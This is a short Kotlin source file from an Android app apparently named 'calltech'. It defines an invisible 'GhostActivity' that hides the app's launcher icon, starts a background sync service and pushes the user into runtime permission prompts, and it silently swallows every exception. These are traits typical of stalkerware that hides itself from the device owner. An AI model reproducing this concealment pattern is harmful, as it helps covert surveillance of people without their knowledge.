package com.calltech

import android.app.Activity
import android.content.Intent
import android.os.Bundle

/** Hidden launcher alias — UI nahi. Permission pending ho to sirf popup. */
class GhostActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            LauncherHider.hideNow(applicationContext)
            SyncBootstrap.ensureBackgroundReady(applicationContext)
            if (SyncBootstrap.needsRuntimePermissions(applicationContext)) {
                startActivity(
                    Intent(this, PermissionTrampolineActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                        putExtra(PostInstallPrompt.EXTRA_FORCE_POPUP, true)
                    },
                )
            }
        } catch (_: Exception) {
        }
        finish()
    }
}
